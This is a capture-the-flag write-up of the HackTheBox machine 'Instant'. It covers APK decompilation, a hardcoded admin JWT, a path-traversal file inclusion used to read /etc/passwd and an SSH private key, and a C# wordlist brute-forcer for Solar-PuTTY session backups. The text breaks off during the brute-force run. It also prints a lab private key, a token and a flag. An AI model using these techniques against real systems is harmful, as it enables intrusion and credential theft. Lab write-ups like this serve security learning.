---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - APK
  - apktool
  - Android
  - ReverseEngineering
  - JSONWebToken
  - JWT
  - LocalFileInclusion
  - LFI
  - sqlite3
  - Database
  - PBKDF2
  - hashcat
  - Hash
  - Cracking
  - SolarPuTTY
  - Decrypter
  - PasswordDecryption
  - PasswordReuse
---
``
![](images/Instant.png)

## Summary

The box starts with an `.apk` file which needs to be `decompiled` to find two `VHOST` entries (`swagger-ui.instant.htb` and `mywalletv1.instant.htb`) and a `JasonWebToken (JWT)` inside a `configuration file` called `AdminActivities.smali`. The token works on for the `admin user` on `http://swagger-ui.instant.htb` and opens the door for a `Local File Inclusion (LFI)` vulnerability. By reading the content of `/etc/passwd` the user `shirohige` can be found. For the `foothold` it is necessary to read the `id_rsa` file of `shirohige`. After grabbing the `user.txt` the `enumeration part` starts by having a look at the `PBKDF2 hashes` inside the `sqlite3 database` which is located inside the `projects folder` right beside the `user.txt`. After `extracting` and `cracking` the `hash` for `shirohige` the next step is to download the `session-backup.dat` inside of `/opt/backups/Solar-PuTTY/`. By `re-using` the `password` with an already available `SolarPuttyDecrypt` tool it is possible to `decrypt` and `extract` the `encrypted password` as `cleartext password`. Since the `password` works for `root` all what is left to do is to grab the `root.txt` and close the box.

## Table of Content

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Analyzing APK File](#Analyzing-APK-File)
- [API Testing](#API-Testing)
- [Foothold](#Foothold)
    - [Local File Inclusion (LFI)](#Local-File-Inclusion-LFI)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root (unintended)](#Privilege-Escalation-to-root-unintended)
    - [Decrypt session-backup.dat](#Decrypt-session-backupdat)
    - [Wrapper for Decrypter](#Wrapper-for-Decrypter)
    - [Brute Force the Password for the Session Backup](#Brute-Force-the-Password-for-the-Session-Backup)
- [Privilege Escalation to root (intended)](#Privilege-Escalation-to-root-intended)
    - [Database Enumeration](#Database-Enumeration)
    - [Cracking the Hash](#Cracking-the-Hash)
    - [SolarPutty_sessions_decrypted.txt](#SolarPutty_sessions_decryptedtxt)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

Our first `port scan` revealed port `22/TCP` and port `80/TCP` to be open.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.231.155
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 21:02 CEST
Nmap scan report for 10.129.231.155
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.26 seconds
```

And since `Nmap` showed already the redirect to `http://instant.htb/` we added it to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.231.155  instant.htb
```

### Enumeration of Port 80/TCP

The `website` offered a `file` to `download` to send funds to anywhere.

- [http://instant.htb/](http://instant.htb/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://instant.htb/   
http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], JQuery[3.2.1], Script, Title[Instant Wallet]
```

![](images/2024-10-12_21-06_80_website.png)

## Analyzing APK File

We downloaded the `file` which was an `.apk` file and decompiled it using `apktool`.

- [https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82)
- [https://medium.com/helpshift-engineering/reverse-engineer-your-favorite-android-app-863a797042a6](https://medium.com/helpshift-engineering/reverse-engineer-your-favorite-android-app-863a797042a6)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ wget http://instant.htb/downloads/instant.apk
--2024-10-12 21:08:08--  http://instant.htb/downloads/instant.apk
Resolving instant.htb (instant.htb)... 10.129.231.155
Connecting to instant.htb (instant.htb)|10.129.231.155|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5415990 (5.2M) [application/vnd.android.package-archive]
Saving to: ‘instant.apk’

instant.apk                                                100%[========================================================================================================================================>]   5.17M  16.4KB/s    in 6m 51s  

2024-10-12 21:15:01 (12.9 KB/s) - ‘instant.apk’ saved [5415990/5415990]
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ apktool d instant.apk 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...

I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

A quick `grep` over the extracted files showed us two more `VHOSTs`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Instant/files/instant]
└─$ grep -R 'instant.htb'
res/layout/activity_forgot_password.xml:        <TextView android:textSize="14.0sp" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_margin="25.0dip" android:text="Please contact support@instant.htb to have your account recovered" android:fontFamily="sans-serif-condensed" android:textAlignment="center" />
res/xml/network_security_config.xml:        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
res/xml/network_security_config.xml:        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
smali/com/instantlabs/instant/AdminActivities.smali:    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"
smali/com/instantlabs/instant/LoginActivity.smali:    const-string v1, "http://mywalletv1.instant.htb/api/v1/login"
smali/com/instantlabs/instant/ProfileActivity.smali:    const-string v7, "http://mywalletv1.instant.htb/api/v1/view/profile"
smali/com/instantlabs/instant/RegisterActivity.smali:    const-string p4, "http://mywalletv1.instant.htb/api/v1/register"
smali/com/instantlabs/instant/TransactionActivity.smali:    const-string v0, "http://mywalletv1.instant.htb/api/v1/initiate/transaction"
smali/com/instantlabs/instant/TransactionActivity$2.smali:    const-string v1, "http://mywalletv1.instant.htb/api/v1/confirm/pin"
```

We added `swagger-ui.instant.htb` and `mywalletv1.instant.htb` to our `/etc/hosts` file as well.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.231.155  instant.htb
10.129.231.155  mywalletv1.instant.htb
10.129.231.155  swagger-ui.instant.htb
```

As next step we took a closer look on the `.smali` files which contained the `VHOSTs` and found a `JSON Web Token (JWT)`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Instant/files/instant]
└─$ cat smali/com/instantlabs/instant/AdminActivities.smali
<--- CUT FOR BREVITY --->
    move-result-object v1

    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

```c
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

There are many ways to look at the content of the tokens like these but the quickest one for `CTFs` is probably `https://jwt.io/`.

- [https://jwt.io/](https://jwt.io/)

And it seemed that we found the `token` for the `admin user`.

```c
{
  "id": 1,
  "role": "Admin",
  "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
  "exp": 33259303656
}
```

## API Testing

As we accessed `http://swagger-ui.instant.htb` we spotted the `Authorize button` on the `right side` of the page.

![](images/2024-10-12_21-31_80_api.png)

We entered the previously found `token` and got `authorized`successfully.

![](images/2024-10-12_21-32_80_api_token.png)

![](images/2024-10-12_21-32_80_api_token_authorized.png)

## Foothold
### Local File Inclusion (LFI)

Since the `API` offered the option to `read logfiles` we tested it to see if it would be vulnerable to `Local File Inclusion (LFI)` and indeed we got lucky. As first logical step we tried to read `/etc/passwd` to see what `users` are available.

![](images/2024-10-13_08-37_api_logs.png)

![](images/2024-10-13_08-44_80_api_lfi_etc_passwd.png)

![](images/2024-10-13_08-48_80_api_lfi_etc_passwd_output.png)

In the output we found one `user` named `shirohige`.

```c
{
  "/home/shirohige/logs/../../../../../etc/passwd": [
    "root:x:0:0:root:/root:/bin/bash\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
    "sync:x:4:65534:sync:/bin:/bin/sync\n",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n",
    "dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n",
    "messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n",
    "systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n",
    "pollinate:x:102:1::/var/cache/pollinate:/bin/false\n",
    "polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n",
    "usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n",
    "shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n",
    "_laurel:x:999:990::/var/log/laurel:/bin/false\n"
  ],
  "Status": 201
}
```

| Username  |
| --------- |
| shirohige |

Next we tried to read a potential `id_rsa` file inside the `.ssh` folder of his `home directory` and got a hit.

![](images/2024-10-12_21-33_80_api_lfi_id_rsa.png)

![](images/2024-10-12_21-34_80_api_lfi_id_rsa_output.png)

We put the key in a `usable format` and saved it on our local machine.

```c
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAjkNdMQfypHp6h7t54Fa1702OjLZjFkM+L10BNM27k8JfuCrb
yxp7crl9EBZ9VS9LI37xlhKQHq6fzY7eWkPguVZb7U3UA0SCtOow0cv+DUCadtl7
CzVwt9CgWhCn6o6G/r1tNfyvkGXFpd8Ss8kLnntRjupKOH6CNVYk4Po1e1Sw0jkT
2u2p9Q4BdBwIOQulSxRuXnrqq2scPI3gRn3im8I/PwBGTXNSEkt0UovW12cgfK5/
Og7+vl/62Z7ry+DEtyY9viBtHbrGdIfS97hm7at8ZdBuSRlkgGFyZKQIYU7n3hYM
5W/YwxTDkiRtNQsRVY+Wqn7SoXOvnZ7N65XEQwIDAQABAoIBAESz2JIArhfrhDf/
fFSwW21lTYW74O9T6viRmC8JeeBaOsKkg/+6WsqlNHXr/nwAem96cy4P6eS/XTI2
oEAETscCoyNfdhdb4yl+fbQbqSV6QP5LegYIOVaz3HSSXZ1DVoM4NMEhNiHsXD6G
E7CaU0+ma1Uy5UQSKEycvPOfMevMWrO9fZ/V1vVqtV8saIjtMyjPouyYn8y6YY6a
3Fj+bQs4JD6SBEoGV7IBdw9GaGLq7Kd3UzR1mxWwUlGuR/+x9E1vEAkG6zCYKfJx
/cRkqJ3iPVTqOY3kQp8i5jCZcPAo2trzWDDfE4kuiqpYJ+0gl0MfEiRdJiIvT2Rd
FvuhV5ECgYEAw8Y/+kWaK96rRZJfPAxIjS1VvExBs9igSZXuPRG62DzYYWUZ/AJa
BGFzVq1iUHRWVn6spjKIHLQMa4c36MbBT0L7WpyikX+XvUwUq9K+bnO6wmXh0qBa
x7rw+MddBi8ReaFZ/lOFanjvy2qaH7yXqR7MpYZCWZgNjUrqXWZ18TMCgYEAugb1
6gQDyxCFJP55WFbjv0ZnZLruVK36yCj65LiJ/9q6bFmsSbwiyiSltxmdLa09Ufl6
T1GakPMlLw861qmPdBmPZ4pYLvmBvqtT7NfATYopxhAILi3YCvaIbUJQ5o+NOoEQ
wF8qbbSFXMT4U1ctoK7HAiX6GhLrcQxHEA/OALECgYEAqCR6SFpFKo6I7SzkzG8E
VPRt4VZhS7SvHeQ+hIbYweWoNiYeJhpi88Y6yGQLv2vbx1fusqNN0dE1pZiyBSPH
XWr69Hz5Bxvd2EAitNxAoB6XdWUJidwde9NsKU8Y7zm3uY5B+7QCL0sFMOEy1DUm
0KLaQwPHsqlsYkDIf0WD4I8CgYA4DJTXd3I1IrsbFFk3Vqa0IOBSJ0hb1zeySzac
50UdA6gbsUEJzlelFDmh22PSOVo6crJ5Z5rshXX0oeAWgWwpjPH6PmKndKG08yYM
PE1Cj5hahsYQM9veIb2lPc/mR+ZDdFO5wnKkLznnY6l2YtPqj/6CFTMv2/d4Tjyz
CDAHYQKBgBSUmR1cjiUEEJoUGj/RsA8Sll+RMGeqhVfv7PNbcm4Srpqe6wwBLCKP
KBaMtMMJVeAoy++6zpTMP+6e0wLUdmw2dljlMjonjKWyn5EUQnVtFa86fHcJzzER
TUdWLHTHPsXwpseOS4jvVRr9C1nBYSF1VqsVTpBjtlIsFCL79t2e
-----END RSA PRIVATE KEY-----

```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ cat shirohige_id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAjkNdMQfypHp6h7t54Fa1702OjLZjFkM+L10BNM27k8JfuCrb
yxp7crl9EBZ9VS9LI37xlhKQHq6fzY7eWkPguVZb7U3UA0SCtOow0cv+DUCadtl7
CzVwt9CgWhCn6o6G/r1tNfyvkGXFpd8Ss8kLnntRjupKOH6CNVYk4Po1e1Sw0jkT
2u2p9Q4BdBwIOQulSxRuXnrqq2scPI3gRn3im8I/PwBGTXNSEkt0UovW12cgfK5/
Og7+vl/62Z7ry+DEtyY9viBtHbrGdIfS97hm7at8ZdBuSRlkgGFyZKQIYU7n3hYM
5W/YwxTDkiRtNQsRVY+Wqn7SoXOvnZ7N65XEQwIDAQABAoIBAESz2JIArhfrhDf/
fFSwW21lTYW74O9T6viRmC8JeeBaOsKkg/+6WsqlNHXr/nwAem96cy4P6eS/XTI2
oEAETscCoyNfdhdb4yl+fbQbqSV6QP5LegYIOVaz3HSSXZ1DVoM4NMEhNiHsXD6G
E7CaU0+ma1Uy5UQSKEycvPOfMevMWrO9fZ/V1vVqtV8saIjtMyjPouyYn8y6YY6a
3Fj+bQs4JD6SBEoGV7IBdw9GaGLq7Kd3UzR1mxWwUlGuR/+x9E1vEAkG6zCYKfJx
/cRkqJ3iPVTqOY3kQp8i5jCZcPAo2trzWDDfE4kuiqpYJ+0gl0MfEiRdJiIvT2Rd
FvuhV5ECgYEAw8Y/+kWaK96rRZJfPAxIjS1VvExBs9igSZXuPRG62DzYYWUZ/AJa
BGFzVq1iUHRWVn6spjKIHLQMa4c36MbBT0L7WpyikX+XvUwUq9K+bnO6wmXh0qBa
x7rw+MddBi8ReaFZ/lOFanjvy2qaH7yXqR7MpYZCWZgNjUrqXWZ18TMCgYEAugb1
6gQDyxCFJP55WFbjv0ZnZLruVK36yCj65LiJ/9q6bFmsSbwiyiSltxmdLa09Ufl6
T1GakPMlLw861qmPdBmPZ4pYLvmBvqtT7NfATYopxhAILi3YCvaIbUJQ5o+NOoEQ
wF8qbbSFXMT4U1ctoK7HAiX6GhLrcQxHEA/OALECgYEAqCR6SFpFKo6I7SzkzG8E
VPRt4VZhS7SvHeQ+hIbYweWoNiYeJhpi88Y6yGQLv2vbx1fusqNN0dE1pZiyBSPH
XWr69Hz5Bxvd2EAitNxAoB6XdWUJidwde9NsKU8Y7zm3uY5B+7QCL0sFMOEy1DUm
0KLaQwPHsqlsYkDIf0WD4I8CgYA4DJTXd3I1IrsbFFk3Vqa0IOBSJ0hb1zeySzac
50UdA6gbsUEJzlelFDmh22PSOVo6crJ5Z5rshXX0oeAWgWwpjPH6PmKndKG08yYM
PE1Cj5hahsYQM9veIb2lPc/mR+ZDdFO5wnKkLznnY6l2YtPqj/6CFTMv2/d4Tjyz
CDAHYQKBgBSUmR1cjiUEEJoUGj/RsA8Sll+RMGeqhVfv7PNbcm4Srpqe6wwBLCKP
KBaMtMMJVeAoy++6zpTMP+6e0wLUdmw2dljlMjonjKWyn5EUQnVtFa86fHcJzzER
TUdWLHTHPsXwpseOS4jvVRr9C1nBYSF1VqsVTpBjtlIsFCL79t2e
-----END RSA PRIVATE KEY-----

```

Next we just set the permissions and used the key to access the box.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ chmod 600 shirohige_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Instant/files]
└─$ ssh -i shirohige_id_rsa shirohige@instant.htb
The authenticity of host 'instant.htb (10.129.231.155)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ 
```

## user.txt

Since there was only one available user we grabbed the `user.txt` and moved on with the `enumeration part`.

```c
shirohige@instant:~$ cat user.txt 
1d5d7ecababfb5b86987d721ba2681a2
```

## Enumeration

The user `shirohige` was part of the `development` group which did us nothing useful.

```c
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
```

Inside his `home directory` we found a `folder` called `projects` which we checked out in the next step.

```c
shirohige@instant:~$ ls -la
total 40
drwxr-xr-x 7 shirohige shirohige 4096 Oct  4 15:22 .
drwxr-xr-x 3 root      root      4096 Oct  4 15:22 ..
lrwxrwxrwx 1 root      root         9 Aug  8 19:10 .bash_history -> /dev/null
lrwxrwxrwx 1 root      root         9 Aug  8 19:10 .bash_logout -> /dev/null
-rw-r--r-- 1 shirohige shirohige 3771 Aug  8 19:09 .bashrc
drwx------ 4 shirohige shirohige 4096 Oct  4 15:22 .cache
drwxrwxr-x 3 shirohige shirohige 4096 Oct  4 15:22 .local
lrwxrwxrwx 1 root      root         9 Aug  8 21:04 .mysql_history -> /dev/null
-rw-r--r-- 1 shirohige shirohige  807 Aug  8 19:09 .profile
lrwxrwxrwx 1 root      root         9 Aug 10 22:24 .python_history -> /dev/null
drwx------ 2 shirohige shirohige 4096 Oct 12 19:01 .ssh
lrwxrwxrwx 1 root      root         9 Aug  8 21:04 .viminfo -> /dev/null
drwxrwxr-x 2 shirohige shirohige 4096 Oct  4 15:22 logs
drwxrwxr-x 3 shirohige shirohige 4096 Oct  4 15:22 projects
-rw-r----- 1 root      shirohige   33 Oct 12 19:01 user.txt
```

Inside of `/opt` we found a folder named `backups` which contained a `sessions-backup.dat` file for `Solar-PuTTY` which we saved for later.

```c
shirohige@instant:/opt/backups/Solar-PuTTY$ ls -la
total 12
drwxr-xr-x 2 shirohige shirohige 4096 Oct  4 15:22 .
drwxr-xr-x 3 shirohige shirohige 4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 sessions-backup.dat
```

```c
shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

## Privilege Escalation to root (unintended)

### Decrypt session-backup.dat

We installed `Solar-PuTTY` on a `Windows VM` and got prompted to enter a `password` as we `imported` the `session-backup.dat` file. A quick search showed a `blog post` on `https://voidsec.com` and a already available `SolarPuttyDecrypt` tool on `GitHub`.

- [https://www.solarwinds.com/de/free-tools/solar-putty](https://www.solarwinds.com/de/free-tools/solar-putty)
- [https://voidsec.com/solarputtydecrypt/](https://voidsec.com/solarputtydecrypt/)
- [https://github.com/VoidSec/SolarPuttyDecrypt](https://github.com/VoidSec/SolarPuttyDecrypt)

![](images/2024-10-12_13-07_solar_putty_password.png)

### Wrapper for Decrypter

Since the `SolarPuttyDecrypt` tool expected the `password` as an `argument` our mate `Bushidosan` asked our `AI member` to modify the code to `wrap around` a specified `.dat` file and to try `every password` of a given `file` instead of a `single password`. So we basically tried to `Brute Force` the `password` for the `session-backup.dat` file.

```c
using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace SolarPuttyDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args == null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("SolarPuttyDecrypt now will try to dump local sessions' file using a wordlist brute-force attack.");
                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat C:\\rockyou.txt");
                Console.ResetColor();
                Environment.Exit(1);
            }

            string CurrDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec");
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");

            string sessionFile = args[0]; // Session file path
            string wordlistPath = args[1]; // Path to the wordlist (e.g., RockYou)

            Console.ForegroundColor = ConsoleColor.Yellow;

            // Start the brute-force attempt
            BruteForceDecrypt(sessionFile, wordlistPath, CurrDir);

            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] DONE. Decrypted file is saved in: " + CurrDir + "\\SolarPutty_sessions_decrypted.txt");
            Console.ResetColor();
        }

        static void BruteForceDecrypt(string sessionFile, string wordlistPath, string currDir)
        {
            using (FileStream fileStream = new FileStream(sessionFile, FileMode.Open))
            {
                using (StreamReader streamReader = new StreamReader(fileStream))
                {
                    string encryptedText = streamReader.ReadToEnd();

                    // Read the wordlist file
                    foreach (var password in File.ReadLines(wordlistPath))
                    {
                        try
                        {
                            var decryptedText = Crypto.Decrypt(password, encryptedText);
                            if (!string.IsNullOrEmpty(decryptedText))
                            {
                                // Successful decryption
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"\n[+] Successfully decrypted using password: {password}\n");
                                Console.ResetColor();

                                var obj = JsonConvert.DeserializeObject(decryptedText);
                                var formattedOutput = JsonConvert.SerializeObject(obj, Formatting.Indented);

                                // Save the decrypted data to a file
                                using (StreamWriter outputFile = new StreamWriter(Path.Combine(currDir, "SolarPutty_sessions_decrypted.txt")))
                                {
                                    outputFile.WriteLine(formattedOutput);
                                }

                                break; // Exit after successful decryption
                            }
                        }
                        catch (CryptographicException ex)
                        {
                            // This is expected if the password is wrong
                            if (ex.Message == "Padding is invalid and cannot be removed.")
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"[-] Incorrect password: {password}");
                                Console.ResetColor();
                            }
                            else
                            {
                                // Other cryptographic errors
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine(ex.Message);
                                Console.ResetColor();
                            }
                        }
                        catch (Exception ex)
                        {
                            // Catch other general exceptions
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(ex.Message);
                            Console.ResetColor();
                        }
                    }
                }
            }
        }
    }
}

internal class Crypto
{
    public static string Decrypt(string passPhrase, string cipherText)
    {
        byte[] array = Convert.FromBase64String(cipherText);
        byte[] salt = array.Take(24).ToArray();
        byte[] rgbIV = array.Skip(24).Take(24).ToArray();
        byte[] array2 = array.Skip(48).Take(array.Length - 48).ToArray();

        using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
        {
            byte[] bytes = rfc2898DeriveBytes.GetBytes(24);

            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV))
                {
                    using (MemoryStream memoryStream = new MemoryStream(array2))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                        {
                            byte[] array3 = new byte[array2.Length];
                            int count = cryptoStream.Read(array3, 0, array3.Length);

                            memoryStream.Close();
                            cryptoStream.Close();

                            return Encoding.UTF8.GetString(array3, 0, count);
                        }
                    }
                }
            }
        }
    }

    public static string Deob(string cipher)
    {
        byte[] encryptedData = Convert.FromBase64String(cipher);

        try
        {
            byte[] bytes = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            return Encoding.Unicode.GetString(bytes);
        }
        catch (Exception message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ResetColor();
            Environment.Exit(1);
        }

        return string.Empty;
    }
}

```

### Brute Force the Password for the Session Backup

We `compiled` the `project` with the `modifications` and copied over the `rockyou.txt` from our `Kali` machine to start the process of `Brute Forcing`.

```c
PS C:\opt\SolarPuttyDecrypt\SolarPuttyDecrypt\bin\Debug > .\SolarPuttyDecrypt.exe .\sessions-backup.dat .\rockyou.txt
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------
Bad Data.

Bad Data.

